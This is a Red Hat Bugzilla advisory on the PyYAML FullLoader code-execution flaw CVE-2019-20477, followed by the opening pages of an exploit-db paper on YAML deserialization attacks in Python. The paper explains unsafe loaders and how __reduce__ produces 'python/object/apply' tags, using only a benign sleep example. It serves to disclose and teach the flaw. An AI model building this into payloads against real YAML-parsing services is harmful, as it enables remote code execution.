- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1806005**](show_bug.cgi?id=1806005)
(CVE-2019-20477)
- [CVE-2019-20477](https://access.redhat.com/security/cve/CVE-2019-20477) PyYAML: command execution through python/object/apply constructor in FullLoader

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2019-20477 PyYAML: command execution through python/object/apply construc...

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2019-20477 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | medium | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1806010](show_bug.cgi?id=1806010 "CLOSED ERRATA - CVE-2019-20477 PyYAML: command execution through python/object/apply constructor in FullLoader [fedora-all]") [1806011](show_bug.cgi?id=1806011 "CLOSED NOTABUG - CVE-2019-20477 python2-pyyaml: PyYAML: insufficient restrictions on the load and load_all functions [epel-all]") [1806013](show_bug.cgi?id=1806013 "CLOSED NOTABUG - CVE-2019-20477 python3-PyYAML: PyYAML: insufficient restrictions on the load and load_all functions [epel-all]") [1807434](show_bug.cgi?id=1807434) [1810084](show_bug.cgi?id=1810084) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1806012](show_bug.cgi?id=1806012) | | TreeView+ | [depends on](buglist.cgi?bug_id=1806005&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1806005&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2020-02-21 20:02 UTC by Guilherme de Almeida Suckevicz | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-02-16 20:32 UTC ([History](show_activity.cgi?id=1806005)) | | [CC List:](page.cgi?id=fields.html#cclist) | 20 users (show)  bdettelb dbecker hhorak jeckersb jjoyce jorton jschluet j lhh lpeer mburns orion python-maint rschiron sclewis sfowler slinaber slong TicoTimo tomckay | | Fixed In Version: | pyYAML 5.2 | | | Doc Type: | If docs needed, set a value | | | Doc Text: | A vulnerability was discovered in the PyYAML library, where it is susceptible to arbitrary code execution when it processes untrusted YAML files through the full\_load method or with the FullLoader loader. Applications that use the library to process untrusted input may be vulnerable to this flaw. An attacker could use this flaw to execute arbitrary code on the system by abusing the python/object/apply constructor. | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2020-11-04 02:24:28 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2020:4641](https://access.redhat.com/errata/RHSA-2020%3A4641) | 0 | None | None | None | 2020-11-04 02:35:50 UTC | | Red Hat Product Errata | [RHSA-2021:0420](https://access.redhat.com/errata/RHSA-2021%3A0420) | 0 | None | None | None | 2021-02-04 16:14:35 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1806005#c0)  Guilherme de Almeida Suckevicz    2020-02-21 20:02:23 UTC  ``` PyYAML 5.1 through 5.1.2 has insufficient restrictions on the load and load_all functions because of a class deserialization issue, e.g., Popen is a class in the subprocess module. NOTE: this issue exists because of an incomplete fix for [CVE-2017-18342](https://access.redhat.com/security/cve/CVE-2017-18342).  References: <https://github.com/yaml/pyyaml/blob/master/CHANGES>   ```  [Comment 1](show_bug.cgi?id=1806005#c1)  Guilherme de Almeida Suckevicz    2020-02-21 20:04:26 UTC  ``` Created PyYAML tracking bugs for this issue:  Affects: fedora-all [[bug 1806010](show_bug.cgi?id=1806010 "CLOSED ERRATA - CVE-2019-20477 PyYAML: command execution through python/object/apply constructor in FullLoader [fedora-all]")]   Created python2-pyyaml tracking bugs for this issue:  Affects: epel-all [[bug 1806011](show_bug.cgi?id=1806011 "CLOSED NOTABUG - CVE-2019-20477 python2-pyyaml: PyYAML: insufficient restrictions on the load and load_all functions [epel-all]")]   Created python3-PyYAML tracking bugs for this issue:  Affects: epel-all [[bug 1806013](show_bug.cgi?id=1806013 "CLOSED NOTABUG - CVE-2019-20477 python3-PyYAML: PyYAML: insufficient restrictions on the load and load_all functions [epel-all]")]   ```  [Comment 2](show_bug.cgi?id=1806005#c2)  Summer Long    2020-02-24 05:04:06 UTC  ``` RHOSP: This flaw is a result of incomplete fixes from CVE-2017-18342; the OpenStack analysis at that time still applies. [https://bugzilla.redhat.com/show_bug.cgi?id=1595743#c16](show_bug.cgi?id=1595743#c16 "CLOSED ERRATA - CVE-2017-18342 PyYAML: yaml.load() API could execute arbitrary code")   ```  [Comment 5](show_bug.cgi?id=1806005#c5)  Riccardo Schirone    2020-02-25 10:25:16 UTC  ``` Lowering the Impact of the flaw to Moderate as, same for [CVE-2017-18342](https://access.redhat.com/security/cve/CVE-2017-18342), load and load_all functions were already known to be unsafe and they should not be used with untrusted input.   ```  [Comment 6](show_bug.cgi?id=1806005#c6)  Riccardo Schirone    2020-02-25 11:19:38 UTC  ``` The issue is in the new Loader called FullLoader introduced in PyYAML 5.1, which was supposed to fix [CVE-2017-18342](https://access.redhat.com/security/cve/CVE-2017-18342). FullLoader is used by default by the yaml.load function and it was thought it was safer as explained in [https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation](https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load%28input%29-Deprecation). However, it is still possible to execute arbitrary code by using the python/object/apply constructor.  Upstream PR: <https://github.com/yaml/pyyaml/pull/347>  Upstream fix: <https://github.com/yaml/pyyaml/commit/8c5e47fe62d7b9e0282a176a4b79b8b2980dc704>   ```  [Comment 9](show_bug.cgi?id=1806005#c9)  Riccardo Schirone    2020-02-25 17:18:47 UTC  ``` Even though the CVSS is 9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H, the Impact of this flaw is set to Medium as `yaml.load`/`yaml.full_load` should not be used on untrusted input. When untrusted input needs to be parsed, `SafeLoader` or `yaml.safe_load` must be used instead. This has been documented for a very long time in PyYAML.   ```  [Comment 10](show_bug.cgi?id=1806005#c10)  Riccardo Schirone    2020-02-26 10:35:37 UTC  ``` FullLoader, which is the class where this vulnerability lies, was introduced in upstream version 5.1. Red Hat Enterprise Linux 7 and 8 currently ship an older version of PyYAML, that does not contain the vulnerable class, so they are not affected.   ```  [Comment 12](show_bug.cgi?id=1806005#c12)  Riccardo Schirone    2020-02-26 10:43:23 UTC  ``` Mitigation:  Use `yaml.safe_load` or the SafeLoader loader when you parse untrusted input.   ```  [Comment 14](show_bug.cgi?id=1806005#c14)  Jason Shepherd    2020-02-27 00:55:58 UTC  ``` Statement:  This issue did not affect the versions of PyYAML as shipped with Red Hat Enterprise Linux 7, and 8 as they did not include the class FullLoader, which contains this vulnerability.  The PyYAML libary that is provided in the Red Hat OpenStack repositories is vulnerable. However, because there are no instances where this library is used in a way which exposes the vulnerability, the impact to OpenStack products has been reduced to 'low' and Red Hat will not be providing a fix at this time.  Any updates will be through RHEL channels.  Red Hat Quay 3.2 uses the vulnerable load function, but only to parse the Nginx configuration file, which only contains trusted data.   ```  [Comment 20](show_bug.cgi?id=1806005#c20)  Product Security DevOps Team    2020-11-04 02:24:28 UTC  ``` This bug is now closed. Further updates for individual products will be reflected on the CVE page(s):  <https://access.redhat.com/security/cve/cve-2019-20477>   ```  [Comment 21](show_bug.cgi?id=1806005#c21)  errata-xmlrpc    2020-11-04 02:35:47 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 8  Via RHSA-2020:4641 [https://access.redhat.com/errata/RHSA-2020:4641](https://access.redhat.com/errata/RHSA-2020%3A4641)   ```  [Comment 22](show_bug.cgi?id=1806005#c22)  errata-xmlrpc    2021-02-04 16:14:32 UTC  ``` This issue has been addressed in the following products:    Red Hat Quay 3  Via RHSA-2021:0420 [https://access.redhat.com/errata/RHSA-2021:0420](https://access.redhat.com/errata/RHSA-2021%3A0420)   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1806005&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from www.exploit-db.com_df3ce52a_20250121_003224.html ===
YAML Deserialization
Attack in Python

`

NOVEMBER 13

by: Manmeet Singh & Ashish Kukreti

1

Author Details:

Manmeet Singh (j0lt)

Twitter: @_j0lt

Ashish Kukreti (LoneRanger)

Twitter: @lon3_rang3r

Reviewer:

Dr. Sparsh Sharma

Facebook: @sparshsharma

Dedicated to 550th Birth Anniversary of Guru Nanak

2

CONTENT

FORWARD ………………………………………………………………………………………………………………………………………….4

What is YAML?.............................................................................................................................4

YAML MODULES IN PYTHON ………………………………………………………………………………………………………………5

PyYAML ………………………………………………………………………………………………………………………………….5

ruamel.yaml …………………………………………………………………………………………………………………………11

Autoyaml ……………………………………………………………………………………………………………………………..16

SERIALIZING AND DESERIALIZING CUSTOM OBJECTS OF PYTHON CLASSES IN YAML ……………………….19

EXPLOITING YAML DESERIALIZATION ………………………………………………………………………………………………34

Exploiting YAML in PyYAML version < 5.1 …………………………………………………………………………...35

Exploiting YAML in PyYAML version >= 5.1 ………………………………………………………………………….36

Exploiting YAML in ruamel.yaml ………………………………………………………………………………………….43

MITIGATION ……………………………………………………………………………………………………………………………………45

REFERENCES ……………………………………………………………………………………………………………………………………46

3

FORWARD

What is YAML?

According to the definition in Wikipedia, YAML (Yet Another Markup Language) is a human-readable
data serialization language, it is commonly used for configuration files and in applications where data
is being stored or transmitted. It uses both Python-style indentations to indicate nesting, and a more
compact format that uses [] for lists and {} for maps making YAML a superset of JSON.

Example:

Un-Serialized Data:

{'a':'hello','b':'world','c':['this', 'is',' yaml']}

YAML Serialized Data:

a: hello
b: world
c:
- this
- is
- ' yaml'

YAML is used in various applications irrespective of their platform weather it is a web application,
thick client application, mobile application etc. One can go to https://yaml.org/ to know more about
YAML project.

4

YAML MODULES IN PYTHON

In python, there are modules like PyYAML, ruamel.yaml etc. dealing with YAML. In this paper, we will
discuss all these modules and the technique of serialization and deserialization of data. PyYAML is
very much wild being an only stable module to deal with YAML data in both Python 2.x and 3.x.

PyYAML

PyYAML is a third-party python module that deals with YAML serialization and deserialization of data.
It is available for both Python 2.x and 3.x. Its author is Kirill Simonov.

To know more about PyYAML python module, one can refer its documentation by going to
https://pyyaml.org/wiki/PyYAMLDocumentation.

PyYAML have many methods to dump/ serialize data, below are some most important one,

Methods

Description

Serialize a Python object/data  into a YAML stream. It
uses dump_all() and by default uses
Dumper=yaml.Dumper .

dump()

Default usage:

dump(data, stream=None,
Dumper=yaml.Dumper)

Serialize a sequence of Python objects/data into a
YAML stream. Used with a list of data to be serialized.

Default usage:

dump_all(documents, stream=None,
Dumper=Dumper,default_style=None,
default_flow_style=False,canonical=None,
indent=None,
width=None,allow_unicode=None,
line_break=None,encoding=None,
explicit_start=None,
explicit_end=None,version=None,
tags=None, sort_keys=True)
Serialize a sequence of Python objects into a YAML
stream safely. No python class objects will be
serialized if mentioned in the data. It uses dump_all()

5

dump_all()

safe_dump()

with Dumper=yaml.SafeDumper by default and
Dumper is not user-controllable.

Default usage:

safe_dump(data, stream=None)

Serialize a sequence of Python objects into a YAML
stream. Produce only basic YAML tags. No python
class objects will be serialized if mentioned in the
data. Used with a list of data to be serialized. It uses
dump_all() with Dumper=yaml.SafeDumper by
default and Dumper is not User controllable.

Default usage:

safe_dump_all(documents, stream=None)

safe_dump_all()

Serialization of data with dump() method :

Code:

import yaml

a = {'a': 'hello', 'b': 'world', 'c': ['this', 'is', ' yaml']}  # raw data

serialized_data = yaml.dump(a)  # serializing data

print(serialized_data)  # printing yaml serialized data

Output:

a: hello
b: world
c:
- this
- is
- ' yaml'

The above code has data stored in variable “a” and when this data is supplied to yaml.dump(), it
returns serialized data shown in the output above. This output is human readable and arranged in a
very systematic way.

For deserializing of data, we have a couple of methods, below are some of them which are very
commonly used in PyYAML

6

Methods

Description

load()

load_all()

full_load()

full_load_all()

safe_load()

Deserialize data with default Loader=FullLoader.
If Loader=None , it will take Loader= FullLoader
by default

Default usage:

load(stream, Loader=None)
Deserialize a stream of data in a list with default
Loader=FullLoader. If Loader=None , it will take
Loader= FullLoader by default

Default usage:

load_all(stream, Loader=None)
Deserialize data with Loader=FullLoader by
default and Loader is not user controllable in
this method. In actual load() is called with
arguments specified as load(data,
Loader=FullLoader). Exists only in version >= 5.1.

Default usage:

full_load(stream)

Deserialize a stream of data in a list with
Loader=FullLoader by default and Loader is not
user controllable in this method. In actual
load_all() is called with arguments specified as
load_all(stream,Loader=FullLoader). Exists only
in version >= 5.1.

Default usage:

full_load_all(stream)

Deserialize data with Loader=SafeLoader by
default and Loader is not user-controllable. It
rejects to deserialize ,serialized declared python
class objects.  In actual load() is called with
arguments specified as  load(stream,
Loader=SafeLoader).

Default usage:

safe_load(stream)

7

safe_load_all()

unsafe_load()

unsafe_load_all()

Deserialize a stream of data in a list with
Loader=SafeLoader by default and Loader is not
user controllable in this method. It rejects to
deserialize, serialized declared python class
objects. In actual load_all() is called with
arguments specified as
load_all(stream,Loader=SafeLoader).

Default usage:

safe_load_all(stream)
Deserialize data with Loader=UnsafeLoader by
default and Loader is not user controllable in
this method. In actual load() is called with
arguments specified as load(data,
Loader=UnsafeLoader). Exists only in version >
=5.1.

Default usage:

unsafe_load(stream)

Deserialize a stream of data in a list with
Loader=UnsafeLoader by default and Loader is
not user controllable in this method. In actual
load_all() is called with arguments specified as
load_all(stream,Loader=UnsafeLoader). Exists
only in version >= 5.1.

Default usage:

unsafe_load_all(stream)

Deserialization of data with load() method:

import yaml

a = b'a: hello\nb: world\nc:\n - this\n - is\n - \' yaml\' '
# yaml serialized data

deserialized_data = yaml.load(a)  # deserializing data

print(deserialized_data)  # printing deserialized data

8

Output:

{'a': 'hello', 'b': 'world', 'c': ['this', 'is', ' yaml']}
C:/Users/j0lt/paper_files/main.py:5: YAMLLoadWarning: calling yaml.load()
without Loader=... is deprecated, as the default Loader is unsafe. Please
read https://msg.pyyaml.org/load for full details.
  deserialized_data = yaml.load(a)  # deserializing data

The above example shows the working of load() function in deserialization of YAML data saved in
variable “a”. Kindly note the serialized data is the same as the output of the previous example. The
output shows the data in its raw form and we got our data back.

Note that just after showing the output, the console is throwing a warning about the load() function,
as we are using PyYAML version 5.2.1 which is the latest at the time of writing this paper. You will not
find this type of warning in PyYAML version < 5.1.  Yes, the maintainer knew that this load() method is
not safe by default, so they applied some patches in its newest versions and that’s why every time we
use load() method with default “Loader” argument to deserialize objects, it checks the execution and
execute it if it is safe but every time it prints this warning message about load() method as the default
Loader argument is “None” and by default consider “FullLoader” if not specified as shown below.

Also, this load_warning(‘load’) is a class method of YAMLLoadWarning which generate warning
message as shown below. This class doesn’t exist in version < 5.1 of PyYAML.

9

Later the maintainer of this module started recommending every user to use methods like
safe_load(), safe_dump() or use load() with “Loader=SafeLoader” (eg.
yaml.load(serialized_data,Loader=yaml.SafeLoader)) to deserialize and serialize data respectively as
these methods are made not to work on custom objects of classes.

Let’s try to execute the last code in PyYAML version < 5.1 and the output will be:

{'a': 'hello', 'b': 'world', 'c': ['this', 'is', ' yaml']}

In exact, we are using version 4.2b4 to execute the same code which was the last version which was
not showing any warnings. So we get data without any warning message in the console.

Many other third-party modules that work on YAML are built on PyYAML module, like, autoyaml,
aio_yamlconfig etc. Those modules which are using SafeLoader of PyYAML to load serialized data, are
not vulnerable to deserialization vulnerability, example, simple-yaml, aspy.yaml, Yamlable  etc.
autoyaml and aio_yamlconfig and many others are not safe as they use default loader or unsafe
loaders with load() method.

Kindly note, there are many other methods which do serialization and deserialization that were
earlier specified like unsafe_load(), safe_load() etc. out of them only load() and load_all() throw
warning message, rest of modules work on very specific Loader , so there is no need of showing the
warning messages for some unsafe methods like unsafe_load(), full_load() etc. , as maintainer
believes that the user already knows why these modules are getting used and how they work.

10

ruamel.yaml

ruamel.yaml is also a well-known python module which works on YAML serialized data. It works on
the same principles of PyYAML. It also has dump() and load() methods and works the same as
PyYAML. It is available for both python 3.x and 2.x.

Difference between PyYAML and ruamel.yaml are,

ruamel.yaml is a derivative of Kirill Simonov’s PyYAML 3.11 and would not exist without that. PyYAML
supports the YAML 1.1 standard, ruamel.yaml supports YAML 1.2 as released in 2009.

•  YAML 1.2 dropped support for several features unquoted Yes, No, On, Off
•  YAML 1.2 no longer accepts strings that start with a 0 and solely consist of number characters
as octal, you need to specify such strings with 0o[0-7]+ (zero + lower-case o for octal + one or
more octal characters).

•  YAML 1.2 no longer supports sexagesimals, so the string scalar 12:34:56 doesn’t need quoting.
•  \/ escape for JSON compatibility
•  Correct parsing of floating-point scalars with exponentials
•  Unless the YAML document is loaded with an explicit version==1.1 or the document starts

with % YAML 1.1, ruamel.yaml will load the document as version 1.2.

Like PyYAML it has almost similar methods for serializing data,

Methods

Description

dump()

Serialize a Python object/data  into a YAML
stream.

Default usage:

dump(data,stream=None,
    Dumper=Dumper,
    default_style=None,
    default_flow_style=None,
    canonical=None,
    indent=None,
    width=None,
    allow_unicode=None,
    line_break=None,
    encoding=enc,
    explicit_start=None,
    explicit_end=None,
    version=None,

11

    tags=None,
    block_seq_indent=None,
)

Serialize a sequence of Python objects/data into
a YAML stream. Used with a list of data to be
serialized.

Default usage:

dump_all(
    documents,
    stream=None,
    Dumper=Dumper,
    default_style=None,
    default_flow_style=None,
    canonical=None,
    indent=None,
    width=None,
    allow_unicode=None,
    line_break=None,
    encoding=enc,
    explicit_start=None,
    explicit_end=None,
    version=None,
    tags=None,
    block_seq_indent=None,
    top_level_colon_align=None,
    prefix_colon=None,
)

Serialize a sequence of Python objects into a
YAML stream safely. No python class objects will
be serialized if mentioned in the data. It uses
dump_all() with Dumper=SafeDumper by
default and Dumper is not user-controllable.

Default usage:

safe_dump(data, stream=None)

Serialize a sequence of Python objects into a
YAML stream. Produce only basic YAML tags. No
python class objects will be serialized if
mentioned in the data.Used with a list of data to
be serialized. It uses dump_all() with

12

dump_all()

safe_dump()

safe_dump_all()

Dumper=SafeDumper by default and Dumper is
not User controllable.

Default usage:

safe_dump_all(documents,
stream=None)

Serialization of data with dump() method :

Code:

import ruamel.yaml

a = {'a': 'hello', 'b': 'world', 'c': ['this', 'is', ' yaml']}  # raw data

serialized_data = ruamel.yaml.dump(a)  # serializing data

print(serialized_data)  # printing yaml serialized data

Output:

a: hello
b: world
c: [this, is, ' yaml']

The above example is simply the copy of example shown for dump() functionality in case of PyYAML,
only the output is different in this case, but it is actually same. Conventional block format uses a
hyphen + space to begin a new item in the list and optional inline format is delimited by
comma+space and enclosed in brackets “[ ]”.

Similarly ruamel.yaml use similar methods as PyYAML to deserialize data.

.

13

Methods

Description

Deserialize data with default
Loader=UnsafeLoader, which is equal to
Loader=Loader. If Loader=None , it will take
Loader= UnsafeLoader by default

load()

Default usage:

load(stream, Loader=None,
version=None, preserve_quotes=None)

Deserialize a stream of data in a list with default
Loader=UnsafeLoader. If Loader=None , it will
take Loader= UnsafeLoader by default

load_all()

Default usage:

safe_load()

safe_load_all()

load_all(stream, Loader=None,
version=None, preserve_quotes=None)

Deserialize data with Loader=SafeLoader by
default and Loader is not user-controllable. It
rejects to deserialize serialized declared python
class objects.  In actual load() is called with
arguments specified as  load(stream,
Loader=SafeLoader).

Default usage:

safe_load(stream, version=None)

Deserialize a stream of data in a list with
Loader=SafeLoader by default and Loader is not
user controllable in this method. It rejects to
deserialize serialized declared python class
objects. In actual load_all() is called with
arguments specified as
load_all(stream,Loader=SafeLoader).

Default usage:

safe_load_all(stream, version=None)

14

Deserialization of data with load() method :

Code:

import ruamel.yaml

a = b'a: hello\nb: world\nc: [this, is, \' yaml\']'
# yaml serialized data

deserialized_data = ruamel.yaml.load(a)  # deserializing data

print(deserialized_data)  # printing deserialized data

Output:

{'a': 'hello', 'b': 'world', 'c': ['this', 'is', ' yaml']}
C:/Users/j0lt/paper_files/main.py:7: UnsafeLoaderWarning:
The default 'Loader' for 'load(stream)' without further arguments can be
unsafe.
Use 'load(stream, Loader=ruamel.yaml.Loader)' explicitly if that is OK.
Alternatively include the following in your code:

  import warnings
  warnings.simplefilter('ignore', ruamel.yaml.error.UnsafeLoaderWarning)

In most other cases you should consider using 'safe_load(stream)'
  deserialized_data = ruamel.yaml.load(a)  # deserializing data

We got the output data in exact form, but again we got a warning message about unsafe use of load()
method, but we will not care for this now because for ruamel.yaml, no necessary patches have been
applied to the default load() method to stop the use of the custom object of classes. This warning
originates by calling python warning module used in this module as shown below,

15

For version < 0.15, it will not even throw a warning. In the above example version, 0.16.5 is used
which is latest at the time this paper is written.

Like PyYAML, ruamel.yaml have some methods which use SafeLoader like safe_dump() and
safe_load() etc. to avoid serialization and deserialization of custom object of classes in YAML.

Autoyaml

Autoyaml (https://github.com/martyni/autoyaml) is a YAML config file creator and loader in YAML. It
uses the PyYAML module to load and dump config files from the home directory. It by default search
or write the specified file in the home directory. It uses PyYAML default Loader and Dumper to load
and dump files. It doesn’t throw warning message as the loader is specified as a argument in load()
method in module code as shown below code.

16

To provide a config file to this module one has to put YAML file in the home directory with “.”(dot) in
front.

Example of deserialization:

A file name “.app_name” is saved in the home directory. And this file contains YAML data in this
format,

a: hello
b: world
c: [this, is, ' yaml']

17

Code:

from autoyaml import load_config

my_class = load_config('app_name')
print(my_class)

Output:

{'a': 'hello', 'b': 'world', 'c': ['this', 'is', ' yaml']}

Like this there are many third-party modules on the internet based on PyYAML, just one has to figure
out their working and methods used like shown above.

18

SERIALIZING AND DESERIALIZING CUSTOM OBJECTS
OF PYTHON CLASSES IN YAML

YAML has another interesting feature to serialize and deserialize python objects of classes.
Serialization of objects of classes can be done with dump() and dump_all() method of PyYAML and
ruamel.yaml with its default values for “Dumper”. safe_dump() or safe_dump_all() uses SafeDumper
and don’t support this type of serialization in YAML.

One can serialize any object of custom-made class or any class in built-in modules of python.

Let us take an example of serialization of a custom-made class in it using PyYAML,

Code:

import yaml

class test:
    def __init__(self):
        self.name = "j0lt"
        self.age = 25
        self.religion = "Sikhism"
        self.messages = ["Love", 4, ["every",1]]

serialized_data = yaml.dump(test())  # serializing data
print(serialized_data)   # printing yaml serialized class object

Output:

!!python/object:__main__.test
age: 25
messages:
- Love
- 4
- [every, 1]
name: j0lt
religion: Sikhism

The output represents a serialized object of class test containing initialized class attributes in
__init__().

19

Let us take another example and try to serialize an object of a custom class method,

import yaml

class test:
    def __init__(self):
        self.name = "j0lt"
        self.age = 25
        self.religion = "Sikhism"
        self.messages = ["Love", 4, ["every",1]]

    def ok(self):
        self.value = range(1,10)
        return self.value

serialized_data = yaml.dump(test().ok())  # serializing data

print(serialized_data)   # printing yaml serialized class object

Output;

!!python/object/apply:builtins.range [1, 10, 1]

dump() actually serialized the output returned to it in the form of an object of __builtins__.range() ,
to represent this object type output ,it uses !!python/object/apply:, and also show values passed to
range() function. Kindly note that it is not showing the expected returned value (i.e [1,2,3,4,5,6,7,8,9])
which class method returned this range object, firstly range() always returns an object of an iterator
class by initializing it with given values,

dump() actually serialize the returned value of called class method and if the returned value is in the
form of an object of any function or method, then it will serialize it like above and expect it to execute
or recreate this object when it will be deserialized.

20

Let’s consider some cases where return value is not python object,

return str('test')
 or

return list('test')

then the result of str(‘test’) and list(‘test’) will be considered as data to dump and give output as,

test
...
and

[t, e, s, t]

But for,

return tuple('test')
output is,

!!python/tuple [t, e, s, t]

The reason behind this is, dump knows how to represent strings and lists but don’t know how to
represent a tuple type data, or simply it is an unknown type for YAML, so it considers it as a python
inbuild type representing it with !!python/tuple.

Note that the data is stored in a list and will act as data for the tuple class to convert it back to tuple
when it gets deserialized.

Similarly, we can serialize built-in classes and class methods which come with python interpreter,

21

Example code:

import yaml
import time

class Test(object):

    def __reduce__(self):
        return time.sleep, (10,)

serialized_data = yaml.dump(Test())  # serializing data

print(serialized_data)

Output:

!!python/object/apply:time.sleep [10]

Kindly note that we have used object.__reduce__() class method and this get automatically called just
after __init__() when class is initialized and returns a tuple. It is used for a reason. Whenever you try
to serialize an object, there will be some properties that may not serialize well. For instance, an open
filehandle, in this cases, PyYAML or ruamel.yaml won't know how to handle the object and will throw
an error, as shown below,

Code:

import yaml

class Test(object):

    def __init__(self, file_path='test.txt'):
        self.some_file_i_have_opened = open(file_path, 'wb')

serialized_data = yaml.dump(Test())  # serializing data

print(serialized_data)

22

Output:

Traceback (most recent call last):
  File "C:/Users/j0lt/paper_files/main.py", line 12, in <module>
    deserialized_data = yaml.dump(Test())  # serializing data
  File "C:\Users\j0lt\venv\lib\site-packages\yaml\__init__.py", line 200,
in dump
    return dump_all([data], stream, Dumper=Dumper, **kwds)
  File "C:\Users\j0lt\venv\lib\site-packages\yaml\__init__.py", line 188,
in dump_all
    dumper.represent(data)
  File "C:\Users\j0lt\venv\lib\site-packages\yaml\representer.py", line 26,
in represent
    node = self.represent_data(data)
  File "C:\Users\j0lt\venv\lib\site-packages\yaml\representer.py", line 51,
in represent_data
    node = self.yaml_multi_representers[data_type](self, data)
  File "C:\Users\j0lt\venv\lib\site-packages\yaml\representer.py", line
341, in represent_object
    'tag:yaml.org,2002:python/object:'+function_name, state)
  File "C:\Users\j0lt\venv\lib\site-packages\yaml\representer.py", line
116, in represent_mapping
    node_value = self.represent_data(item_value)
  File "C:\Users\j0lt\venv\lib\site-packages\yaml\representer.py", line 51,
in represent_data
    node = self.yaml_multi_representers[data_type](self, data)
  File "C:\Users\j0lt\venv\lib\site-packages\yaml\representer.py", line
315, in represent_object
    reduce = data.__reduce_ex__(2)
TypeError: cannot serialize '_io.BufferedWriter' object

One alternative is for the object to implement a __reduce__() method. If provided, at the time of
serialization, __reduce__() will be called with no arguments, and it must return either a string or a
tuple. If a string is returned, it names a global variable whose contents are serialized as normal. The
string returned by __reduce__ should be the object's local name relative to its module; the PyYAML
and ruamel.yaml module search the module namespace to determine the object's module.

When a tuple is returned, it must be between two and five elements long. Optional elements can
either be omitted, or None can be provided as their value. But in general, it needs a tuple of at least 2
things:

1. A blank object class to call. In this case, self.__class__.

23

2. A tuple of arguments to pass to the class constructor. In this case, it's a single string, which is the
path to the file to open.

We can tell the PyYAML or ruamel.yaml module, how to handle these types of objects natively within
a class directly with the help of __reduce__.  __reduce__ will tell PyYAML or ruamel.yaml how to
handle this type of object.

Another thing we should note is, __reduce__ don’t allow serialization of the return value of class
specified instead it creates a return value in tuple such that, it serializes an object of a specified class
with required arguments only and don’t let it execute while serialization.

Code:

import yaml

class Test(object):
    def __init__(self, file_path = 'test.txt'):
        self._file_name_we_opened = file_path  # Used later in __reduce__
        self.some_file_i_have_opened = open(self._file_name_we_opened,'wb')

    def __reduce__(self):
        return (self.__class__, (self._file_name_we_opened, ))

serialized_data = yaml.dump(Test())  # serializing data

print(serialized_data)   # printing yaml serialized class object

Output:

!!python/object/apply:__main__.Test [test.txt]

Coming to deserialization, deserialization of objects using YAML modules can be done with below
methods,

24

Methods in PyYAML

Methods in ruamel.yaml

load(data) [works for version < 5.1 and works in
certain conditions for version >=5.1]

load(data)

load(data, Loader=Loader)

load(data, Loader=Loader)

